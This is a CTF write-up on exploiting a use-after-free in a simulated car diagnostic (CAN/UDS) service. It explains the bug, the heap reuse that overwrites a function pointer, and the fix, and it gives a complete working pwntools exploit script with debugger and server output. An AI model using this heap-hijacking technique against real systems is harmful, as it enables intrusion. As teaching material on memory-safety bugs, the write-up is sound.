---
title: Canopysaurus
description: Writeup for the Canopysaurus challenge for cscg2026
tags: cscg2026, pwn, medium
---

# Introduction

In this writeup, I will describe how I analyzed and exploited the "Canopysaurus" challenge from the CSCG 2026 CTF Competition. I will detail how I analyzed the application and how I built my Python script to exploit the vulnerability and capture the flag. Let's get right into it!

# Initial Analysis

The first thing I did, as with every pwn challenge, was to check how the binary was built in the provided Docker container. These are the security flags that are set:

```Makefile
SECURITY_FLAGS = -no-pie -Wl,-z,relro -Wl,-z,lazy -fno-stack-protector -U_FORTIFY_SOURCE -D_FORTIFY_SOURCE=0
```

This tells us a few things. We have no stack canaries (`-fno-stack-protector`), which makes it easier to exploit buffer overflows. In addition to that, PIE is disabled (`-no-pie`), which is great news. PIE stands for Position Independent Executable. If PIE were enabled, the base address of the binary would be randomized on every run. To execute a win function, we would first have to leak a binary address to calculate the correct offsets. With PIE disabled, our lives are a lot easier.

Along with the Docker container, the challenge provided the C source code for the application. After opening the files, I was a bit overwhelmed at first. The main file was around 1000 lines long and contained a significant amount of code. I had never done a pwn challenge comprised of so much source code before, but I kept my motivation and began analyzing the application.

The challenge is an ECU simulator. It simulates a Control Unit of a car that you can communicate with via the CAN bus protocol. Here is the description from the source code:

```C
/*
 * Dino Control Unit (DCU) Simulator
 *
 * A simulated prehistoric vehicle DCU that accepts UDS (Unified Dino Services)
 * messages over a TCP socket using CAN frame framing.
 *
 * Players connect via TCP and send/receive raw 16-byte CAN frames,
 * exactly as they would on a Bedrock-era CAN bus (struct can_frame layout).
 */
```

The application implements a very simplified version of the CAN bus protocol, which is used in cars to allow different components to communicate, log errors, and perform diagnostics. I was not very familiar with the CAN bus protocol, so before digging deeper into the code, I did some basic research on how it works. 

For this specific challenge, the CAN frames are structured like this:

```C
struct can_frame {
    canid_t can_id;       /* CAN ID + EFF/RTR/ERR flags */
    uint8_t can_dlc;      /* data length code: 0..8 */
    uint8_t __pad;
    uint8_t __res0;
    uint8_t __res1;
    uint8_t data[8];      /* payload */
} __attribute__((packed));
```

The program waits in an infinite loop for users to send a CAN frame to a specific port via a TCP socket. Once it receives a message, it checks if the message uses a valid protocol ID. It only accepts messages that are either `UDS_PHYSICAL_ID` or `UDS_REQUEST_ID`.

You can send various messages to interact with the system, such as writing a DID (Data Identifier record), reading a DID, or creating an entry in the DTC (Dino Trouble Code) log. I will explain some of these in more detail later. Here are the available services:

```C
static void process_uds_request(uint8_t *data, uint8_t len) {
    if (len < 1) return;

    uint8_t sid = data[0];
    printf("\n[DCU] >>> Received SID 0x%02X (len=%d)\n", sid, len);

    switch (sid) {
        case SID_DIAG_SESSION_CTRL:
            handle_diag_session_ctrl(data, len);
            break;
        case SID_SECURITY_ACCESS:
            handle_security_access(data, len);
            break;
        case SID_READ_DID:
            handle_read_did(data, len);
            break;
        case SID_WRITE_DID:
            handle_write_did(data, len);
            break;
        case SID_CLEAR_DTC:
            handle_clear_dtc(data, len);
            break;
        case SID_READ_DTC:
            handle_read_dtc(data, len);
            break;
        case SID_REQUEST_DOWNLOAD:
            handle_request_download(data, len);
            break;
        case SID_TRANSFER_DATA:
            handle_transfer_data(data, len);
            break;
        case SID_ROUTINE_CTRL:
            handle_routine_control(data, len);
            break;
        default:
            printf("[DCU] Unknown service 0x%02X\n", sid);
            send_negative_response(sid, NRC_SERVICE_NOT_SUPPORTED);
            break;
    }
    fflush(stdout);
}
```

## Finding The Vulnerability

While reading through the code, one function immediately caught my eye:

```C
void __attribute__((used)) reset_code(dtc_entry_t *arg) {
    FILE *f = fopen(FLAG_PATH, "r");
    if (f) {
        char flag[128];
        memset(flag, 0, sizeof(flag));
        if (fgets(flag, sizeof(flag), f)) {
            printf("[DCU] YABBA DABBA DOO! DIAGNOSTIC OVERRIDE ACTIVATED\n");
            printf("[DCU] RESET CODE: %s\n", flag);
            size_t flag_len = strlen(flag);
            if (flag_len > 0 && flag[flag_len - 1] == '\n') {
                flag[--flag_len] = '\0';
            }
            size_t offset = 0;
            while (offset < flag_len) {
                uint8_t resp[8];
                memset(resp, 0, sizeof(resp));
                resp[0] = 0xFF;
                size_t chunk = flag_len - offset;
                if (chunk > 7) chunk = 7;
                memcpy(&resp[1], &flag[offset], chunk);
                send_can_response(resp, 1 + chunk);
                offset += chunk;
            }
        }
        fclose(f);
    } else {
        printf("[DCU] Flag file not found. Create /flag.txt\n");
    }
    fflush(stdout);
}
```

There it is. Our win function. This function actually never gets called anywhere in the source code, so our objective is clear: hijack the program flow and execute this function. This will cause the server to read the flag file and send the bytes back to us.

Since a massive part of this challenge was just understanding the business logic and how the CAN frames were parsed, I didn't want to waste time blindly fuzzing for edge cases. I initially verified that standard buffer overflows were mitigated by proper size tracking. After that, I did a manual source code review by explicitly searching for all calls to `free()`. 

That is when a subtle but devastating bug caught my eye. In the function responsible for clearing Diagnostic Information, a DTC entry is freed from the heap, but the pointer is not set to `NULL` afterwards.

```C
/* 0x14 - ClearDiagnosticInformation */
static void handle_clear_dtc(uint8_t *data, uint8_t len) {
    // Does stuff...
    if (group == 0xFFFFFF) {
        for (int i = 0; i < dtc_count; i++) {
            if (dtc_table[i]) {
                free(dtc_table[i]); // Entry gets freed here, but the pointer is not set to NULL!
            }
        }
    } else {
        /* Clear specific DTC */
        for (int i = 0; i < dtc_count; i++) {
            if (dtc_table[i] && dtc_table[i]->dtc_code == group) {
                free(dtc_table[i]);
                break;
            }
        }
    }
}
```

This creates a classic Use-After-Free (UAF) vulnerability. A UAF occurs when a program frees memory but keeps the pointer to that invalid memory address. Heap allocators optimize for performance. If we allocate a new chunk of memory that is the exact same size as the one we just freed, the allocator will place our new data exactly where the old data used to be. Our old, dangling pointer will now point to this newly allocated data. If the program later attempts to use that old pointer, it will interact with the data we control.

I checked where else `malloc` is called in the program to see if we could allocate an object of the same size. 
We have one `malloc` allocating space for a new `dtc_entry_t` in `handle_request_download`:
```C
dtc_entry_t *entry = (dtc_entry_t *)malloc(sizeof(dtc_entry_t));
```

A second `malloc` happens in `handle_write_did`:
```C
did_record_t *rec = (did_record_t *)malloc(sizeof(did_record_t));
```

A third `malloc` happens in `handle_routine_control`:
```C
did_record_t *rec = (did_record_t *)malloc(sizeof(did_record_t));
```

I compared the two structs being allocated, `did_record_t` and `dtc_entry_t`:

```C
/* DTC (Dino Trouble Code) entry */
typedef struct dtc_entry {
    uint32_t    dtc_code;
    uint8_t     status;
    uint8_t     severity;
    uint16_t    occurrence_count;
    void        (*report_fn)(struct dtc_entry *self);
    char        description[DTC_DESC_SIZE];
    uint8_t     _pad[8];
} __attribute__((packed)) dtc_entry_t;

/* DID (Data Identifier) record */
typedef struct did_record {
    uint16_t    did_id;
    uint16_t    data_len;
    uint8_t     data[DID_DATA_SIZE];
    uint8_t     writable;
    uint8_t     padding[11];
} __attribute__((packed)) did_record_t;
```

There are three incredibly important takeaways here:

1. The structs are `packed`. This means their memory layout is predictable and avoids hidden compiler padding.
2. We have a function pointer (`report_fn`) in the `dtc_entry_t` struct. If we can overwrite this function pointer with the address of our win function and trigger it, we capture the flag.
3. Both structs are exactly 80 bytes in total size. This confirms our UAF strategy will work flawlessly. Because they are the exact same size, the heap allocator will place a new DID record in the exact same spot where a DTC entry was just freed.

Here is the master plan for the exploit:

1. Send a CAN frame to upgrade the session to an enhanced diagnostic session. This is required to create a DTC entry.
2. Request a download. This calls `handle_request_download`, which allocates our `dtc_entry_t` on the heap and sets up the function pointer.
3. Send a CAN frame to trigger `handle_clear_dtc`. This frees the buffer but leaves the dangling pointer.
4. Write a new DID record to trigger a new allocation over the freed space, allowing us to overwrite the function pointer.
5. Send a final frame to trigger `handle_read_dtc`. At the end of this function, the program executes the following code:

```C
if (entry->report_fn) {
    printf("[DCU] Calling report function at %p\n", (void*)entry->report_fn);
    entry->report_fn(entry);
}
```

Because of our overwrite, `entry->report_fn` will point to our win function instead of the default report function.

## Developing The Exploit

I wrote the exploit in Python using the `pwntools` library. First, I created a helper function to build CAN frames in the exact 16-byte format the application expects:

```python
CAN_FRAME_FMT = "<IBBBB8s"
ROUTINE_CTRL_WRITE_PREFIX = bytes([0x07, SID_ROUTINE_CTRL, 0x03, 0xFF, 0x01])

def build_can_frame(can_id, dlc, data_bytes):
    padded_data = data_bytes.ljust(8, b'\x00')
    frame = struct.pack(CAN_FRAME_FMT, can_id, dlc, 0, 0, 0, padded_data)
    return frame
```

The function takes the `can_id`, which should always be `UDS_PHYSICAL_ID` or `UDS_REQUEST_ID`. The `dlc` is the data length count. The application doesn't strictly rely on this, but it is good practice to include it. The last parameter is our actual payload. The payload always starts with a length byte, followed by the service ID, and finally the actual data for that service.

Next, I wrote functions to send and receive these CAN frames:

```python
def read_can_frame(conn):
    try:
        raw_bytes = conn.recvn(16, timeout=1)
    except EOFError:
        log.error("Connection closed before full frame could be read.")
        return None
    
    if len(raw_bytes) < 16:
        return False

    can_id, dlc, _pad, _res0, _res1, full_payload = struct.unpack(CAN_FRAME_FMT, raw_bytes)
    actual_data = full_payload[:dlc]

    return {
        "can_id": can_id,
        "dlc": dlc,
        "data": actual_data,
        "raw_bytes": raw_bytes
    }

def send_can_frame(conn, can_id, dlc, data_bytes):
    frame = build_can_frame(can_id, dlc, data_bytes)
    info(f"Sending CAN frame: ID=0x{can_id:X}, DLC={dlc}, Data={data_bytes.hex()}")
    conn.send(frame)
    
    response = read_can_frame(conn)
    if response:
        info(f"Received CAN frame: ID=0x{response['can_id']:X}, DLC={response['dlc']}, Data={response['data'].hex()}")
        if response['data'] and response['data'][0] == 0x7F:
            warn(f"Received negative response: NRC=0x{response['data'][2]:X}")
            return False
    else:
        warn("Failed to read response after sending CAN frame.")
        return False
    return True
```

With our toolkit ready, we can build the exploit chain. 

### Step 1: Upgrade the session.
```python
send_can_frame(conn, UDS_PHYSICAL_ID, 3, bytes([0x02, SID_DIAG_SESSION_CTRL, 0x03]))
```

### Step 2: Send the download request to allocate the DTC entry.
```python
send_can_frame(conn, UDS_PHYSICAL_ID, 3, bytes([0x07, SID_REQUEST_DOWNLOAD, 0xFF, 0xFF, 0x01, 0x02, 0x03, 0xFF]))
```

Let's break down this payload based on how the application processes it:
```C
memset(entry, 0, sizeof(dtc_entry_t));
entry->severity = data[2];
entry->dtc_code = ((uint32_t)data[3] << 16) | ((uint32_t)data[4] << 8) | data[5];
entry->status = data[6];
entry->occurrence_count = 1;
entry->report_fn = default_dtc_report;
snprintf(entry->description, DTC_DESC_SIZE, "DTC-0x%06X", entry->dtc_code);
```
The `data` array here starts with the service ID. The bytes `0xFF 0xFF` are placed in `data[1]` and `data[2]`, mapping to unused padding and severity. The bytes `0x01 0x02 0x03` become the `dtc_code`. We need to remember this code to identify our entry later. `data[6]` sets the status.

### Step 3: Clear the entry to free it and create the dangling pointer.
```python
send_can_frame(conn, UDS_PHYSICAL_ID, 3, bytes([0x04, SID_CLEAR_DTC, 0x01, 0x02, 0x03]))
```
Notice we are using the exact same `dtc_code` (0x01, 0x02, 0x03) to clear it.

### Step 4: Write the DID record into the freed memory. 
We have to do this in two phases: activating extended write, and then writing the actual data. This is necessary because a standard CAN frame limits how much data we can send at once, and we need to overwrite 96 bytes total.

Activate extended write:
```python
send_can_frame(conn, UDS_PHYSICAL_ID, 3, bytes([0x07, SID_ROUTINE_CTRL, 0x01, 0xFF, 0x01, 0xab, 0xcd, 0x60]))
```
* `0x01`: Subfunction to activate extended write.
* `0xFF 0x01`: Required to pass the hardcoded `routine_id` check.
* `0xab 0xcd`: The ID of the DID we are creating.
* `0x60`: The total length we want to write (96 bytes).

Now we can stream data into the buffer:
```python
for i in range(32):
    send_can_frame(conn, UDS_PHYSICAL_ID, 3, ROUTINE_CTRL_WRITE_PREFIX + b"\xFF\xFF\xFF")
    sleep(0.1)
```
For now, we are just sending junk bytes (`0xFF`) to see what happens.

### Step 5: Trigger the UAF by reading the DTC.
```python
send_can_frame(conn, UDS_PHYSICAL_ID, 3, bytes([0x03, SID_READ_DTC, 0x02, 0xFF]))
```
The program uses `0xFF` as a status mask. Because we set our original DTC status to `0xFF` in Step 2, this read will successfully match our dangling entry and attempt to execute `entry->report_fn`.

When running this initial script, we get the following output from the server:

```shell
[DCU] >>> Received SID 0x31 (len=7)
[DCU] Extended write chunk: 96/96 bytes
[DCU] Extended write complete, new DID 0xABCD at 0x3d5812a0

[DCU] >>> Received SID 0x19 (len=3)
[DCU] Reading DTCs with mask 0xFF
[DCU] Calling report function at 0xffffffffffffffff
Segmentation fault (core dumped)
```

Perfect! A beautiful segmentation fault. We successfully overwrote the function pointer with `0xFFFFFFFFFFFFFFFF` and crashed the application.

Now we need to replace the junk bytes with the address of our win function. Because PIE is disabled, the address of `reset_code` is static. The server even kindly prints it for us on startup:
```shell
[DCU] Booting up... Brontosaurus engine online!
[DCU] reset_code located at 0x4016cf
```

To figure out exactly where to place this address in our payload, we need to compare the memory layouts of the two structs. 
In `dtc_entry_t`, the `report_fn` pointer sits exactly at byte offset 8 (a 4-byte int, two 1-byte uint8s, and a 2-byte uint16 before it). Because this is a 64-bit binary, the pointer itself is 8 bytes long.
In `did_record_t`, the `data` buffer begins at byte offset 4. 

The difference between offset 8 and offset 4 is 4 bytes. This means after we write exactly 4 bytes of padding into our `did_record` data buffer, the very next 8 bytes we write will perfectly align with where the function pointer used to be. We just need to send the win function address in little-endian format.

We can update our extended write loop to strategically place the address:

```python
for i in range(32):
        payload_tail = b"\xFF\xFF\xFF"
        if i == 1:
            payload_tail = b"\xAB\xCF\x16"
        elif i == 2:
            payload_tail = b"\x40\x00\x00"
        elif i == 3:
            payload_tail = b"\x00\x00\x00"

        send_can_frame(conn, UDS_PHYSICAL_ID, 3, ROUTINE_CTRL_WRITE_PREFIX + payload_tail)

        if i not in (1, 2, 3):
            sleep(0.1)
```

In the first iteration (`i=0`), we send 3 bytes of padding (`0xFF 0xFF 0xFF`). 
In the second iteration (`i=1`), we send one more byte of padding (`0xAB`), which fulfills our 4-byte offset requirement. The next two bytes (`0xCF 0x16`) are the start of our little-endian address. We finish writing the address in the subsequent iterations.

I attached GDB via `pwntools` to inspect the heap memory and verify the alignment:
```shell
Chunk(addr=0x3cddc2a0, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000000003cddc2a0    cd ab 40 00 ff ff ff ab cf 16 40 00 00 00 00 00    ..@.............]
```
Nice! The memory layout is exactly as calculated. Let's run the full exploit against the remote target:

```shell
[DCU] >>> Received SID 0x19 (len=3)
[DCU] Reading DTCs with mask 0xFF
[DCU] Calling report function at 0x4016cf
[DCU] YABBA DABBA DOO! DIAGNOSTIC OVERRIDE ACTIVATED
[DCU] RESET CODE: dach2026{example_flag}
```

We executed the win function and triggered the flag output! The last step is to loop through the incoming CAN frames in Python and reassemble the flag string:

```python
flag = ""
while True:
    response = read_can_frame(conn)
    if not response:
        break
    flag += response["data"][1:].decode()
success(f"Flag: {flag}")
```

## Mitigations & Learning

How do you prevent a vulnerability like this? Preventing UAFs generally requires strict pointer lifecycle management. The developer actually implemented good defensive practices by using null pointer checks before accessing any entry (`if (dtc_table[i])`). 

The fatal mistake was that the pointers were never set back to `NULL` after the memory was passed to `free()`. Consequently, the null checks passed successfully even though the memory was invalid. In this scenario, adding a simple `dtc_table[i] = NULL;` immediately after the `free(dtc_table[i]);` calls would have completely mitigated the exploit.

I had a tremendous amount of fun with this challenge. It was my first pwn challenge that involved complex application logic and networking rather than a standard 10-line vulnerable C program. I was intimidated at first, but by carefully analyzing the codebase, the pieces finally came together. I managed to craft an exploit I never thought I would be capable of when I first opened the challenge.

Thanks for reading!

## Exploit Script

```python
import struct
from pwn import *
from const import *

CAN_FRAME_FMT = "<IBBBB8s"
ROUTINE_CTRL_WRITE_PREFIX = bytes([0x07, SID_ROUTINE_CTRL, 0x03, 0xFF, 0x01])

def build_can_frame(can_id, dlc, data_bytes):
    # Pad payload data to 8 bytes.
    padded_data = data_bytes.ljust(8, b'\x00')

    # <      : Little-Endian
    # I      : can_id
    # B,B,B,B: dlc, pad, res0, res1
    # 8s     : data array
    frame = struct.pack(CAN_FRAME_FMT, can_id, dlc, 0, 0, 0, padded_data)
    return frame

def read_can_frame(conn):
    # Read exactly 16 bytes (one CAN frame) from the socket.
    try:
        raw_bytes = conn.recvn(16, timeout=1)
    except EOFError:
        log.error("Connection closed before full frame could be read.")
        return None

    if len(raw_bytes) < 16:
        return False

    can_id, dlc, _pad, _res0, _res1, full_payload = struct.unpack(CAN_FRAME_FMT, raw_bytes)
    actual_data = full_payload[:dlc]

    return {
        "can_id": can_id,
        "dlc": dlc,
        "data": actual_data,
        "raw_bytes": raw_bytes
    }

def send_can_frame(conn, can_id, dlc, data_bytes):
    frame = build_can_frame(can_id, dlc, data_bytes)
    info(f"Sending CAN frame: ID=0x{can_id:X}, DLC={dlc}, Data={data_bytes.hex()}")
    conn.send(frame)

    response = read_can_frame(conn)
    if response:
        info(f"Received CAN frame: ID=0x{response['can_id']:X}, DLC={response['dlc']}, Data={response['data'].hex()}")
        # Warn if this is a negative response.
        if response['data'] and response['data'][0] == 0x7F:
            warn(f"Received negative response: NRC=0x{response['data'][2]:X}")
            return False
    else:
        warn("Failed to read response after sending CAN frame.")
        return False
    return True

def exploit():
    conn = remote("127.0.0.1", 18088)
    
    # Upgrade the session to enhanced diagnostic session
    if send_can_frame(conn, UDS_PHYSICAL_ID, 3, bytes([0x02, SID_DIAG_SESSION_CTRL, 0x03])):
        info("Diagnostic session upgraded successfully.")
    else:
        warn("Failed to upgrade diagnostic session.")
        return

    # Request download
    send_can_frame(conn, UDS_PHYSICAL_ID, 3, bytes([0x07, SID_REQUEST_DOWNLOAD, 0xFF, 0xFF, 0x01, 0x02, 0x03, 0xFF]))

    # Send Clear DTC to free the dtc_entry and trigger a use-after-free.
    send_can_frame(conn, UDS_PHYSICAL_ID, 3, bytes([0x04, SID_CLEAR_DTC, 0x01, 0x02, 0x03]))

    # Send a Routine Control request to activate extended write.
    send_can_frame(conn, UDS_PHYSICAL_ID, 3, bytes([0x07, SID_ROUTINE_CTRL, 0x01, 0xFF, 0x01, 0xab, 0xcd, 0x60]))

    # Send 32 frames with 3 data bytes each (= 96 bytes total) to overwrite the struct.
    for i in range(32):
        payload_tail = b"\xFF\xFF\xFF"
        if i == 1:
            payload_tail = b"\xAB\xCF\x16"
        elif i == 2:
            payload_tail = b"\x40\x00\x00"
        elif i == 3:
            payload_tail = b"\x00\x00\x00"

        send_can_frame(conn, UDS_PHYSICAL_ID, 3, ROUTINE_CTRL_WRITE_PREFIX + payload_tail)

        if i not in (1, 2, 3):
            sleep(0.1)
            
    # Read DTC to trigger the use-after-free and execute the win function.
    send_can_frame(conn, UDS_PHYSICAL_ID, 3, bytes([0x03, SID_READ_DTC, 0x02, 0xFF]))

    # Read back response chunks containing the flag.
    flag = ""
    while True:
        response = read_can_frame(conn)
        if not response:
            break
        flag += response["data"][1:].decode()

    success(f"Flag: {flag}")

if __name__ == "__main__":
    exploit()
```